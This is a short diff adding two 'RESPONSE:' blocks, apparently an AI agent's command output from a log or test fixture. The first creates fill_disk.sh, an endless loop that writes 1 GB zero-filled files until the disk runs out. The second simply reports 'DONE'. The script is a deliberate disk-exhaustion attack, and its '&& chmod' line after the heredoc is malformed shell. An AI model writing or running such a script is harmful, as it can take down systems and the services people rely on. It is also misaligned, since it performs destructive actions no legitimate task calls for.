@@ -1,0 +1,14 @@
+RESPONSE: ```bash
+cat > fill_disk.sh <<'EOF'
+#!/bin/bash
+i=0
+while true; do
+  dd if=/dev/zero of=bigfile.$i bs=1M count=1024 status=none
+  i=$((i+1))
+done
+EOF
+&& chmod +x fill_disk.sh
+```
+RESPONSE: ```bash
+DONE
+```
